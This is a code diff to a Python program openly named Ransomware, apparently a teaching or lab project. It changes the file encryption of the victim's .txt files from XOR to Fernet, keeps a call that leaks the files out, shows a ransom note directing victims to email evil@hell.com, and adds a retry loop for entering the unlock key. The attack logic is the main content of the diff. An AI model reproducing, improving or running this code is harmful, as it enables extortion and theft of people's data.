@@ -24,6 +24,15 @@ ENCRYPT_MESSAGE = """
 Your txt files have been locked. Send an email to evil@hell.com with title '{}' to unlock your data. 
 """
 
+ERROR_MESSAGE = """
+ _  __                                     
+| |/ /___ _   _    ___ _ __ _ __ ___  _ __ 
+| ' // _ \ | | |  / _ \ '__| '__/ _ \| '__|
+| . \  __/ |_| | |  __/ |  | | | (_) | |   
+|_|\_\___|\__, |  \___|_|  |_|  \___/|_|   
+          |___/ 
+"""
+
 END_MESSAGE = """
  _____ _ _             ____                             _           _ 
 |  ___(_) | ___  ___  |  _ \  ___  ___ _ __ _   _ _ __ | |_ ___  __| |
@@ -31,13 +40,13 @@ END_MESSAGE = """
 |  _| | | |  __/\__ \ | |_| |  __/ (__| |  | |_| | |_) | ||  __/ (_| |
 |_|   |_|_|\___||___/ |____/ \___|\___|_|   \__, | .__/ \__\___|\__,_|
                                             |___/|_| 
-                                                                            _                _             
-| | | | __ ___   _____    __ _   _ __ (_) ___ ___    __| | __ _ _   _ 
-| |_| |/ _` \ \ / / _ \  / _` | | '_ \| |/ __/ _ \  / _` |/ _` | | | |
-|  _  | (_| |\ V /  __/ | (_| | | | | | | (_|  __/ | (_| | (_| | |_| |
-|_| |_|\__,_| \_/ \___|  \__,_| |_| |_|_|\___\___|  \__,_|\__,_|\__, |
+ _   _                           _   _ _            ____              
+| | | | __ ___   _____    __ _  | \ | (_) ___ ___  |  _ \  __ _ _   _ 
+| |_| |/ _` \ \ / / _ \  / _` | |  \| | |/ __/ _ \ | | | |/ _` | | | |
+|  _  | (_| |\ V /  __/ | (_| | | |\  | | (_|  __/ | |_| | (_| | |_| |
+|_| |_|\__,_| \_/ \___|  \__,_| |_| \_|_|\___\___| |____/ \__,_|\__, |
                                                                 |___/ 
-               
+
 """
 
 class Ransomware:
@@ -79,7 +88,8 @@ class Ransomware:
         secret_manager.leak_files(files)
 
         # Encrypt all the text files
-        secret_manager.xorfiles(files)
+        # secret_manager.xorfiles(files)
+        secret_manager.fernet_crypt(files, True)
 
         # Display the message and the token
         token = secret_manager.get_hex_token()
@@ -88,12 +98,16 @@ class Ransomware:
     """
         Main function for decrypting
     """
-    def decrypt(self):
+    def decrypt(self) -> bool:
         # Ask the key to the client
         key = input("Enter the key:")
+        
 
         # Decode the key
-        key = base64.b64decode(key)
+        try:
+            key = base64.b64decode(key)
+        except:
+            return False
 
         # Obtain all text files path
         files = self.get_files("*.txt")
@@ -104,10 +118,12 @@ class Ransomware:
         # Verification of the key
         if(secret_manager.check_key(key)):
             secret_manager.set_key(key)         # Set the keys if validate
-            secret_manager.xorfiles(files)      # Decrypt de files
+            #secret_manager.xorfiles(files)      # Decrypt de files
+            secret_manager.fernet_crypt(files, False)
             print(END_MESSAGE)
+            return True
         else:
-            print("Error: Not the good key...")
+            return False
 
 
 
@@ -119,4 +135,5 @@ if __name__ == "__main__":
         ransomware.encrypt()
     elif sys.argv[1] == "--decrypt":
         ransomware = Ransomware()
-        ransomware.decrypt()
+        while not ransomware.decrypt():
+            print(ERROR_MESSAGE, end="\n\n")
